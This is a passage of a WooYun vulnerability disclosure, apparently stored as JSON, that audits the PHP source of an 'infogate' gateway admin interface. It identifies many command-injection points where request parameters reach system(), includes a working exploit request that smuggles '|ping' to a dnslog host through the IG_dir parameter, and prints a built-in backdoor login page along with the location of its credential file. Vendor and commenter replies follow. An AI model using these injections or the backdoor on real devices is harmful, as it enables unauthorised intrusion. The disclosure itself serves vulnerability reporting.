$a[2];\t\t$table_name = \"audit_smtp\".$y.$m.$d;\t }    $IG_MailIDs = \"\";\tif ($REQUEST_METHOD == \"POST\"){\t\tif ($IG_opertype == \"AUDIT\"){\t\t\tfor ($i=0; $i<$IG_pagenum; $i++){\t\t\t\tif ($_POST['chkbox'.$i] != \"\"){\t\t\t\t\t$IG_cmd=\"/usr/local/sbin/mailsend -i \".$_POST['chkbox'.$i].\" -t $table_name >/dev/null 2>/dev/null &\";\t\t\t\t\t//echo $IG_cmd.\"<br>\";\t\t\t\t\tsystem($IG_cmd);\n其中此处由于$_POST['chkbox'.$i]未过滤，造成命令执行\n$IG_cmd=\"/usr/local/sbin/mailsend -i \".$_POST['chkbox'.$i].\" -t $table_name >/dev/null 2>/dev/null &\";\t\t\t\t\t//echo $IG_cmd.\"<br>\";\t\t\t\t\tsystem($IG_cmd);\n第二处：src\\application\\firewall\\schedule.php\n<?php  \trequire(\"../../lib/public.inc\");\t\trequire(\"../../lib/session_check.inc\");\t\t\t$_GET[\"IG_localfile\"]=zr_getFilename();\t\t\t//\t当前文件名\t$IG_current_deep=zr_path_deep();\t\t\t\t\t\t\t\t\t\t$jumpToRootpath=zr_JumpToRoot();\t\t\t\t//\t到根目录的跳数\t?>\t<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"><?php  \t$_GET[\"IG_dir\"]=\"/etc/infogate/tmpconf/\";\t\t\t\t\t\t\t\t//\t配置文件根目录\t$_GET[\"IG_promptfile\"]=\"\";\t\t\t\t\t\t\t\t\t\t//\t语言配置文件\t$_GET[\"IG_pagenum\"]=2;\t\t\t\t\t\t\t\t\t\t\t//\t每页条数\t$_GET[\"IG_dir\"]=\"/etc/infogate/firewall/time/\";\t\tif(!file_exists($_GET[\"IG_dir\"])){\t\t$cmd=\"目录不存在!\";\t\tshowmsg($cmd);\t\t\t}\t\t\t$d = dir($_GET[\"IG_dir\"]);\t\t$_GET[\"IG_pagenum\"]=15;\t$IG_COUNT_TIME_NAME=0;\t\twhile (false !== ($entry = $d->read())) {    \t\tif( preg_match(\"/(^\\.$)|(^\\.\\.$)/\",$entry) ){    \t\t\tcontinue;\t\t} \t\t$IG_TIME_FILENAME[$IG_COUNT_TIME_NAME]=$entry;\t\t$IG_COUNT_TIME_NAME ++;\t}    if(!isset($IG_pageno))  \t$IG_pageno=0;   \tfor ($i=($IG_pageno*$_GET[\"IG_pagenum\"]); $i<($IG_pageno*$_GET[\"IG_pagenum\"] + $_GET[\"IG_pagenum\"]); $i++){    \t\t$lines=file($_GET[\"IG_dir\"].\"/\".$IG_TIME_FILENAME[$i]);    \t \tforeach ($lines as $line_num => $line) {    \t    \t\t $ZR_TIME_ARRAY = preg_split(\"/=/\",trim($line), 8, PREG_SPLIT_NO_EMPTY);    \t\t     \t\t if(($ZR_TIME_ARRAY[1]=trim($ZR_TIME_ARRAY[1]))==\"default\")    \t\t \t \t$IG_TIME_INFO[$i.trim($ZR_TIME_ARRAY[0])]=\"\";    \t\t else\t    \t\t \t\t$IG_TIME_INFO[$i.trim($ZR_TIME_ARRAY[0])]=$ZR_TIME_ARRAY[1];    \t\t    \t\t}    \t\t} \t$d->close();\t\tif ($REQUEST_METHOD== \"POST\"){\t\t$IG_pageno=1;\t\t$IG_operation=trim($_POST['IG_operation']);\t\t\tif($IG_operation == \"IG_delete\"){\t\t\t// 防火墙规则文件\t\t\t$IG_accessfile=\"/etc/infogate/firewall/access.conf\";\t\t\t$IG_appaccessfile=\"/etc/infogate/firewall/appaccess.conf\";\t\t\t// 时间段是否已在防火墙中使用\t\t\t$flag_norepeat=true;\t\t\t$IG_error_msg=\"\";\t\t\t\t\t\tfor($i=0; $i<=$_GET[\"IG_pagenum\"]; $i++){\t\t\t\t$flag=true;\t\t\t\t$IG_str=trim($_POST['IG_checkbox'.$i]);\t\t\t\t\tif ($IG_str != \"\"){\t\t\t\t\t\t// 在防火墙规则配置文件中找此时间配置,如果存在,则不能删除\t\t\t\t\t\t$IG_error_msg=\"\";\t\t\t\t\t\t$IG_rulinfo=locaterecord($IG_accessfile, 12, 4, $IG_str, \"|\");\t// 访问控制\t\t\t\t\t\tif ($IG_rulinfo[0] != \"\"){\t\t\t\t\t\t\t$IG_error_msg=$IG_str.\" 已在访问控制中应用，不能被删除！\";\t\t\t\t\t\t\t$flag=false;\t\t\t\t\t\t}\t\t\t\t\t\tif ($flag == true){\t\t\t\t\t\t\t$IG_rulinfo=locaterecord($IG_appaccessfile, 12, 4, $IG_str, \"|\");\t// 访问控制\t\t\t\t\t\t\tif ($IG_rulinfo[0] != \"\"){\t\t\t\t\t\t\t\t$IG_error_msg=$IG_str.\" 已在应用控制中应用，不能被删除！\";\t\t\t\t\t\t\t\t$flag=false;\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t\t\t\t\t// 删除文件\t\t\t\t\tif($flag)\t\t\t\t   \t{\t\t\t\t\t\t$cmd = \"rm \".$_GET[\"IG_dir\"].$IG_str.\" -f\";\t\t\t\t\t\tsystem($cmd);\t\t\t\t\t\t$IG_cmd=\"sync > /dev/null\";\t\t\t\t\t\tsystem($cmd);\n关键代码\n$cmd = \"rm \".$_GET[\"IG_dir\"].$IG_str.\" -f\";\t\t\t\t\t\tsystem($cmd);\n直接执行，get获取值只要满足如下条件利用方式如下：**.**.**.**/src/application/firewall/schedule.php?IG_pagenum=5&IG_dir=a|ping werwrer3.xxxx.dnslog.info postdata:IG_operation=IG_delete&IG_checkbox=1如图\n\ncloudeye收到的dns解析请求（证明命令执行）\n\n第三处命令执行：src\\application\\vpn\\tab\\tab_show_ipsec_tunnellist.php关键代码\nif ($_SERVER['REQUEST_METHOD'] == \"POST\"){\tfor($IG_i=0; $IG_i< $IG_pagenum; $IG_i++)\t{\t\t$IG_tunnelname=trim($_POST['IG_chbox'.$IG_i]);\t\tif ($IG_tunnelname != \"\"){\t\t\t//showmsg($IG_str);//注意是否要加上($IG_str!=\"\")\t\t\t$IG_tunnelstarted=checktunnelstarted($IG_tunnelname);\t\t\tif ($IG_tunnelstarted==1){\t\t\t\t$IG_prompt=GetPrompt($IG_promptfile, $IG_localfile, \"tunnelisrunning\", \"隧道已启用，请停止再删除！\");\t\t\t\tshowmsg($IG_tunnelname.$IG_prompt);\t\t\t\t//continue;\t\t\t}else{\t\t\t\t$IG_basedir=\"/etc/infogate/VPN/ipsec.d/zr_user\";\t\t\t\t$IG_tunnelfile = $IG_basedir.\"/##\".$IG_tunnelname.\".ui\";\t\t\t\t$IG_secretfile=$IG_basedir.\"/##\".$IG_tunnelname.\".secrets\";\t\t\t\tif (file_exists($IG_tunnelfile)){\t\t\t\t\tunlink($IG_tunnelfile);\t\t\t\t\tunlink($IG_secretfile);\t\t\t\t}\t\t\t\t$IG_tunnelfile = $IG_basedir.\"/\".$IG_tunnelname.\".ui\";\t\t\t\t$IG_secretfile=$IG_basedir.\"/\".$IG_tunnelname.\".secrets\";\t\t\t\tif (file_exists($IG_tunnelfile)){\t\t\t\t\tunlink($IG_tunnelfile);\t\t\t\t\tunlink($IG_secretfile);\t\t\t\t}\t\t\t\t\t$IG_cmd=\"/usr/local/super/bin/super ipsec auto --down\".\" \".$IG_tunnelname.\" > /dev/null\";\t\t\t\tsystem($IG_cmd,$retv);\t\t\t\t$IG_cmd=\"/usr/local/super/bin/super  ipsec auto --delete $IG_tunnelname > /dev/null\";\t\t\t\tsystem($IG_cmd);\n可执行地方为\n$IG_cmd=\"/usr/local/super/bin/super ipsec auto --down\".\" \".$IG_tunnelname.\" > /dev/null\";\t\t\t\tsystem($IG_cmd,$retv);\n跟踪该变量$IG_tunnelname\n$IG_tunnelname=trim($_POST['IG_chbox'.$IG_i]);\n同理，post可控即可造成命令执行第四处：src\\application\\log\\stat_virus_name.php\n$IG_dir=\"/var/log/infogate/\";\t$IG_top=$_POST['IG_top'];\t$IG_sdate=zr_trim($_POST['IG_s_date'], \"-\");\t$IG_edate=zr_trim($_POST['IG_edate'], \"-\");\t\t$IG_cmd=\"/boot/sbin/infogate/getsort.sh -v -n \".$IG_sdate.\" \".$IG_edate.\" > /dev/null\";//\techo $IG_cmd;\tsystem($IG_cmd, $IG_status);\n其中$IG_sdate 可控，同理命令执行第四处：\\src\\application\\vpn\\tab\\tab_show_ipsec_status.php\n$IG_tunnelname=$_GET['IG_tunnelname'];$IG_type=$_GET['IG_type'];if ($IG_type == \"start\"){\t// 修改文件名\t$IG_tunnelfile2=$IG_basedir.\"/##\".\"$IG_tunnelname\".\".ui\";\tif (file_exists($IG_tunnelfile2)){\t\t$IG_tunnelfile=$IG_basedir.\"/$IG_tunnelname\".\".ui\";\t\trename($IG_tunnelfile2, $IG_tunnelfile);\t}\t\t$IG_secretfile2=$IG_basedir.\"/##\".$IG_tunnelname.\".secrets\";\tif (file_exists($IG_secretfile2)){  \t\t$IG_secretfile=$IG_basedir.\"/$IG_tunnelname\".\".secrets\";  \t\trename($IG_secretfile2, $IG_secretfile);\t}\t$IG_tunnelstarted=checktunnelstarted($IG_tunnelname);////\tif ($IG_tunnelstarted==1) {\t\t$IG_prompt=GetPrompt($IG_promptfile, $IG_localfile, \"tunnelrunning\", \"隧道已启用！\");\t\tshowmsg(\"$IG_prompt\");\t}else {\t\t\t\t\t\t\t$IG_cmd = \"/usr/local/sbin/create_ipsec_tunnel.sh /etc/infogate/VPN/ipsec.d/zr_user/\";\t\t\tsystem($IG_cmd,$retv);\t\t\t\t\t   \t\t$IG_cmd = \"  /usr/local/sbin/create_ipsec_secrets.sh /etc/infogate/VPN/ipsec.d/zr_user/\";\t\t\tsystem($IG_cmd,$retv);\t\t\t   \t\t\t$IG_cmd=\"/usr/local/super/bin/super  ipsec auto --delete\".\" \".$IG_tunnelname.\" > /dev/null\";\t\t\tsystem($IG_cmd,$retv);\n其中$IG_tunnelname = $IG_tunnelname=$_GET['IG_tunnelname'];  直接执行命令第五出：\\src\\application\\vpn\\tab\\tab_show_c-to-s_status.php\n$IG_type=$_GET['IG_type'];\tif ($IG_type == \"close\"){\t\t$IG_pid = $_GET['IG_pid'];\t\t$IG_cmd=\"kill $IG_pid > /dev/null\";\t\tsystem($IG_cmd)\t;\t\t\t}?>\n第6处：src\\application\\firewall\\getadress.php\nif(empty($IG_ipaddr)||$IG_ipaddr==\"\"){\t\t\t\t\t\t\t\t\t\tshowmsg(\"请选输入启始IP\");\t\t\t\t\t\t\t\t\t\t}else\tif(empty($card_eth_name)||$card_eth_name==\"\"){\t\t\t\t\t\t\t\t\t\tshowmsg(\"请选择接口\");\t\t\t\t\t\t\t\t\t\t}else\tif(empty($IG_ipaddr2)||$IG_ipaddr2==\"\"){\t\t\t\t\t\t\t\t\t\tshowmsg(\"请选输入结束IP\");\t\t\t\t\t\t\t\t\t}else{\t\t\t\t\t\t\t\t\t\tif(empty($IG_isScan)){//是否扫描地址设置中已存在的地址\t\t\t\t\t\t$IG_flag=\"0\";\t\t\t\t\t\t$cmd=\"/usr/local/sbin/getiplist -s $IG_ipaddr -e $IG_ipaddr2 -i $card_eth_name -f $IG_batchfile -c\";\t\t\t\t\t\t\t\t\t\t}else{\t\t\t\t\t\t$IG_flag=$IG_isScan;\t\t\t\t\t\t$cmd=\"/usr/local/sbin/getiplist -s $IG_ipaddr -e $IG_ipaddr2 -i $card_eth_name -f $IG_batchfile\";\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t//$cmd=\"/usr/local/sbin/getiplist -s $IG_ipaddr -e $IG_ipaddr2 -i $card_eth_name -f $IG_batchfile\";\t\t\t\t\t//echo $cmd.\"<br>\";\t\t\t\t\tsystem($cmd);\n第7处：\\src\\system\\update.php\n20 \t$zr_debug=0;21 \t22 \tif ($REQUEST_METHOD==\"POST\"){23 \t\t$IG_filename=\"/var/log/infogate/upload/\".$_FILES['IG_uploadfile']['name'];24 \t\techo $IG_filename;exit();25 \t\t#/usr/local/thttpd/src/system/26 27 \t\t$_GET[\"IG_opertime\"]=date(\"Y-m-d H:i:s\");28 \t\t$_GET[\"IG_clientIP\"]=getIP();29 \t\tif(($_FILES['IG_uploadfile']!=\"none\")&&($_FILES['IG_uploadfile']!=\"\")){30                 31 \t\tif($GLOBALS[\"zr_debug\"])32          33 \t\tshowmsg(\"�ļ��ϴ������룺\".$_FILES['IG_uploadfile']['error']);34 \t\t\t\t\t35 \t\t\tif(copy($_FILES['IG_uploadfile']['tmp_name'],$IG_filename)){36 \t\t\t37 \t\t\tif($GLOBALS[\"zr_debug\"])38 \t\t\tshowmsg(\"copy�ɹ�����\".$_FILES['IG_uploadfile']['error']);39 40 \t\t\t//070307 -- //Ԭ��˵�ڽ�ѹ��ǰ �����update-2.2Ŀ¼41 \t\t\t$IG_cmd=\"rm /var/program/update-2.2 -rf > /dev/null\";42 \t\t\tsystem($IG_cmd);43 44 \t\t\t\t$IG_cmd=\"tar zxvf \".$IG_filename.\" -C \".\"/var/program/ > /dev/null\";45                                 #echo $IG_cmd;exit();46 \t\t\t\tsystem($IG_cmd);\n第8处：\\src\\application\\firewall\\editschedule.php\nif ($REQUEST_METHOD == \"GET\"){\t\t\t\tif ($_GET[\"IG_timeID\"] == \"\")\t\texit();\t\t$IG_filename=$_GET[\"IG_dir\"].$_GET[\"IG_timeID\"];\t\t\t\t\tif (!file_exists($IG_filename)) {    \t\t    \t\t\t\tshowmsg(\"时间配置文件\".$_GET[\"IG_timeID\"].\"\\\\n不存在！\");\t\t\t\thistoryback();\t\t\t} \t\t\telse{\t\t\t\t// 时间信息数组\t\t\t\t$IG_timeinfo=array();\t\t\t\t\t\t\t$lines=file($IG_filename);\t\t\t\tforeach ($lines as $line_num => $line) \t\t\t\t{\t\t\t\t\t$ZR_TIME_ARRAY = preg_split(\"/=/\",trim($line), 8, PREG_SPLIT_NO_EMPTY);\t\t\t\t\t\t$IG_timeinfo[trim($ZR_TIME_ARRAY[0])]=trim($ZR_TIME_ARRAY[1]);\t\t\t\t}\t \t\t}\t \t}\telse if ($_SERVER['REQUEST_METHOD'] == \"POST\"){\t\t$IG_filename_tmp=$_GET[\"IG_dir_tmp\"].$_POST[\"IG_timeID\"];\t\t$IG_filename=$_GET[\"IG_dir\"].$_POST[\"IG_timeID\"];\t\t\t$IG_time_str=\"\";\t\t\t\t// 起始时间\t\t\t$IG_TimeStart=\"$IG_HourStart:$IG_MinStart\";\t\t\t$IG_TimeStop=\"$IG_HourStop:$IG_MinStop\";\t\t\tif (! (($IG_TimeStart == \"00:00\")&&($IG_TimeStop == \"00:00\")) ){\t\t\t\t$IG_time_str.=\"timestart=\".$IG_TimeStart.\"\\n\";\t\t\t\t\t$IG_time_str.=\"timestop=\".$IG_TimeStop.\"\\n\";\t\t\t\t}\t\t\t\t//星期\t\t\t$IG_days=\"\";\t\t\tfor ($i=0; $i<7; $i++){\t\t\t\t$IG_tmpstr=trim($_POST['IG_checkbox'.$i]);\t\t\t\tif ($IG_tmpstr != \"\"){\t\t\t\t\tif ($IG_days != \"\")\t\t\t\t\t\t$IG_days .=\",\";\t\t\t\t\t$IG_days .=$IG_tmpstr;\t\t\t\t\t}\t\t\t\t\t\t}\t\t\tif($IG_days!=\"\"){\t\t\t\t$IG_time_str.=\"days=\".$IG_days.\"\\n\";\t\t\t}\t\t\t\t\t// 起始日期\t\t\t\tif( ! ($IG_DateStart==\"\" && $IG_DateStop==\"\" ) )\t\t\t{\t\t\t\t$IG_DateStart=str_replace('-', ':', $IG_DateStart);\t\t\t\t$IG_DateStop=str_replace('-', ':', $IG_DateStop);\t\t\t\t$IG_time_str.=\"datestart=\".$IG_DateStart.\"\\n\";\t\t\t\t$IG_time_str.=\"datestop=\".$IG_DateStop.\"\\n\";\t\t\t}\t\t\t\t\t\t// memo\t\t\t$IG_time_str.=\"memo=\".$IG_Memo.\"\\n\";\t\t// 日志记录\t\t$_GET[\"IG_opertime\"]=date(\"Y-m-d H:i:s\");\t\t$_GET[\"IG_clientIP\"]=getIP();\t\t$IG_logmsg=$_GET[\"IG_clientIP\"].\"|\".$_GET[\"IG_opertime\"].\"|\".$IG_loginname.\"|防火墙|时间段|修改时间段设置\";\t\taddMsgtoFile($IG_MANAGEOPERLOG, $IG_logmsg);\t\t\t$handle = fopen ($_GET[\"IG_dir_tmp\"].\"/\".$_POST[\"IG_timeID\"], \"w\");\t\t// 将$somecontent写入到我们打开的文件中。\t\t    if (!fwrite($handle,$IG_time_str)) {\t\t\tshowmsg( \"不能写入到文件 $filename\");\t\t\t\t\techo \"<script language=\\\"JavaScript\\\">\\n<!--\\n\";\t\t\t\t\t\techo \"location.href=\\\"schedule.php\\\";\\n\";\t\t\t\t\t\techo \"// -->\\n</script>\\n\"; \t\t    }\t\t    fflush($handle);\t\t    fclose($handle);\t\t\t\t\t\t$IG_cmd=\"mv \".$IG_filename_tmp.\" \".$IG_filename.\" >/dev/null 2>/dev/null\";\t\tsystem($IG_cmd);\n第9处：src/application/virus/sortbyname.php\n$IG_dir=\"/var/log/infogate/scanvir/\";\t$IG_top=$_POST['IG_top'];\t$IG_sdate=zr_trim($_POST['IG_s_date'], \"-\");\t$IG_edate=zr_trim($_POST['IG_e_date'], \"-\");\t\t$IG_cmd=\"/usr/local/sbin/wingetsort.sh -n \".$IG_sdate.\" \".$IG_edate;//\techo $IG_cmd;\tsystem($IG_cmd, $IG_status);\t\t$IG_filename=$IG_dir.\"virusname.sort\";\n第10处：src/application/virus/sortbyip.php\n$IG_dir=\"/var/log/infogate/scanvir/\";\t$IG_top=$_POST['IG_top'];\t$IG_sdate=zr_trim($_POST['IG_s_date'], \"-\");\t$IG_edate=zr_trim($_POST['IG_e_date'], \"-\");\t\t$IG_cmd=\"/usr/local/sbin/wingetsort.sh -i \".$IG_sdate.\" \".$IG_edate;//\techo $IG_cmd;\tsystem($IG_cmd, $IG_status);\n第11处 官方后门：src/system/backdoor.php\n<?php\tif(isset($_POST[\"session_id\"]))\t\tsession_id($_POST[\"session_id\"]);\t\t\t\tsession_start();\t\t\t$sid=session_id();\t\tif (!isset($IG_login)){\t\tsession_register(\"IG_login\");\t\tsession_register(\"IG_loginname\");\t\tsession_register(\"IG_f_manageuser\");\t\tsession_register(\"IG_f_viewsysconf\");\t\tsession_register(\"IG_f_modifysysconf\");\t\tsession_register(\"IG_f_viewsyslog\");\t\tsession_register(\"IG_logincount\");\t\tsession_register(\"IG_backdoor_user\");\t\t//echo \"32 backdoor>>  IG_backdoor_user >>>\".$IG_backdoor_user;\t\t//TAB 页显示当前菜单路径  如：”系统配置 > 网络设置“\t\tsession_register(\"IG_current_menu_name\");\t\tsession_register(\"IG_current_submenu_name\");\t\t$IG_logincount=0;\t\t$IG_login=false;\t\t$IG_loginname=\"\";\t\t$IG_f_manageuser=\"0\";\t\t$IG_f_viewsysconf=\"0\";\t\t$IG_f_modifysysconf=\"0\";\t\t$IG_f_viewsyslog=\"0\";\t\t$IG_backdoor_user=true; //后门登录的用户不记录操作日志\t}\telse{\t\t//$_SESSION[\"IG_backdoor_user\"]=true;\t\tsession_register(\"IG_backdoor_user\");\t\t\t$IG_backdoor_user = true ;\t}\t  \t  \trequire(\"../lib/public.inc\");  \t\t$jumpToRootpath=zr_JumpToRoot();\t\t\t\t\t\t//\t到根目录的跳数\t$thema_name=\"default\";\t$theme=zr_getTheme($thema_name);\t\t\t\t\t\t//\t主题\t\tif ($REQUEST_METHOD == \"POST\"){\t\t\t$_GET[\"IG_opertime\"]=date(\"Y-m-d H:i:s\");\t\t$_GET[\"IG_clientIP\"]=getIP();\t\t$IG_logincount += 1;\t\t$IG_user_ip=$IG_clientIP;\t\t$IG_userinfo=zr_login_bridge(\"/etc/infogate/center/defaultclient.conf\", $_POST[\"IG_user\"], $_POST[\"IG_passwd\"],$IG_user_ip);\t\t\tif($IG_userinfo==\"ok\"){\t\t\t$IG_login=true;\t\t\t$IG_loginname=$IG_user;\t\t\t$IG_permission=$IG_userinfo;\t\t\t/*\t\t\t$IG_f_manageuser=substr($IG_permission, 0, 1);\t\t\t$IG_f_viewsysconf=substr($IG_permission, 1, 1);\t\t\t$IG_f_modifysysconf=substr($IG_permission, 2, 1);\t\t\t$IG_f_viewsyslog=substr($IG_permission, 3, 1);\t\t\t*/\t\t\t\t\t\t//后门用户 有所有权限\t\t\t$IG_f_manageuser=1;\t\t\t$IG_f_viewsysconf=1;\t\t\t$IG_f_modifysysconf=1;\t\t\t$IG_f_viewsyslog=1;\t\t\t\t\t\t$IG_logmsg=$_GET[\"IG_clientIP\"].\"|\".$_GET[\"IG_opertime\"].\"|\".$IG_loginname.\"|system login| |$IG_loginname login success!\";\t\t\t//addMsgtoFile($IG_MANAGEOPERLOG, $IG_logmsg);\t\t\t\t\t\tsession_register(\"IG_s_cards_num\");\t\t\t\t//\t设备网卡数 \t\t\t$IG_s_cards_num=zr_get_cards_num();\t\t\t\t\t\tHeader(\"Location: ../../index.php?s_id=$sid\");\t\t}\t\telse\t\t\tshowmsg(\"登陆失败 原因:\".$IG_userinfo);\t}?><html><head><?php\techo \"<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=gb2312\\\">\";?><title><? echo zr_get_html_title_name(); ?></title><link href=\"<?echo $theme?>/css/myclass.css\" rel=\"stylesheet\" type=\"text/css\"></head><body leftmargin=\"0\" topmargin=\"0\"><div align=\"left\"><img src=\"<?echo $theme?>/images/title.jpg\" border=1></div><?php\tif ($IG_logincount >= 3){\t\techo \"<div align=\\\"center\\\"><font color=\\\"#666666\\\" size=\\\"5\\\"><b>login fail count than 3!</b></font></div>\";\t\texit();\t}?><br><br><br><br><br><br><table class=submodbg width=\"300\" align=center cellSpacing=1 cellPadding=4>\t<form method=\"POST\" action=\"<?echo $_SERVER[\"PHP_SELF\"]?>\" >\t<input type=\"hidden\" name=\"session_id\" value=\"<?echo $sid?>\" >\t\t<tr class=RowColor1>  \t\t\t<td class=tablehdtop colSpan=2 height=\"25\" align=\"center\">用户登录</td>\t\t</tr>\t\t<tr class=RowColor1>  \t\t\t<td class=\"tablehd\" align=\"right\">用户名</td>  \t\t\t<td><input type=\"text\" name=\"IG_user\" size=\"20\" maxsize=\"50\"></td>\t\t</tr>\t\t<tr class=RowColor1>\t\t\t<td class=\"tablehd\" align=\"right\">密码</td>\t\t\t<td><input type=\"password\" name=\"IG_passwd\" size=\"20\" maxsize=\"50\"></td>\t\t</tr>\t\t<tr class=RowColor1>\t\t\t<td colSpan=2 align=\"center\">\t\t\t\t<input class=\"BTNaction\" type=\"submit\" value=\"确认\" name=\"sutmit1\">\t\t\t\t<input class=\"BTNaction\" type=\"reset\" value=\"取消\" name=\"reset1\">\t\t\t</td>\t\t</tr>\t</form></table></body></html><?phpfunction zr_login_bridge($filename, $user_name, $user_passwd,$user_ip){\tif ($user_name == \"\"){\t\treturn \"|usernameempty|\";\t}\t\t$handle=file_exists($filename);\tif (! $handle){\t\treturn \"|filenotexist|\";\t\t}\t$handle=fopen($filename, \"r\");\tif (! $handle){\t\treturn \"|openfail|\";\t\t}\t$counter=0;\t\t$result_msg=\"\";\t//够着配置文件数组\t$conf_array=array();\t$lines = file($filename);\tforeach ($lines as $line_num => $line) {\t\t$line=trim($line);\t\tif($line==\"\")\t\t\tcontinue;\t\t\t$temp_array=explode(\"=\",$line);\t\t$key=trim($temp_array[0]);\t\t$value=trim($temp_array[1]);\t\t$conf_array[$key]=$value;\t}\t\t//校验\tif(strcmp($user_name,$conf_array[\"loginname\"])!=0)\t\treturn $result_msg=\"|usernotexist|\";\tif(strcmp($user_passwd,$conf_array[\"password\"])!=0)\t\treturn $result_msg=\"|password_error!|\";\tif($conf_array[\"enabled\"]!=1)\t\treturn $result_msg=\"|you'r not allowed to access!|\";\t\t/*\telse if(substr_count($conf_array[\"clientip\"],$user_ip)==0)\t\treturn $result_msg=\"|your ip is not allowed to access!|\";\t*/\telse \t\treturn \"ok\";\t}?>\n默认带有的后门管理员账号和密码储存在/etc/infogate/center/defaultclient.conf文件中\n\n受影响的如下列表：**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php   修复方案：     版权声明：转载请注明来源 老虎皮@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2016-03-07 16:52 厂商回复： CNVD未复现所述情况，已经由CNVD通过以往建立的处置渠道软件生产厂商通报，由其后续提供解决方案并协调相关用户单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-03 09:12 |    \t\t路人毛 \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:64        | 要想Rank给高，标题一定得屌)\t\t \n  膜拜审计牛    \n     2016-03-03 10:14 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  膜拜审计牛    \n     2016-03-07 17:44 |    \t\t子超 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:8        | 啊)\t\t \n  膜拜审计牛    \n     2016-03-10 18:39 |    \t\t邪少 \t\t\t( 实习白帽子  |\t\t\t        Rank:98 漏洞数:18        | 百里长苏)\t\t \n  让我摸一下老虎皮    \n     2016-03-11 09:08 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:329 漏洞数:61        | little red pig!)\t\t \n  膜拜审计牛    \n     2016-03-11 11:52 |    \t\t无名 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:9        | 我是一只小菜鸟呀，伊雅伊尔哟。)\t\t \n  = =。    \n     2016-03-11 12:33 |    \t\tpaper \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        | 无)\t\t \n  膜拜审计牛    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}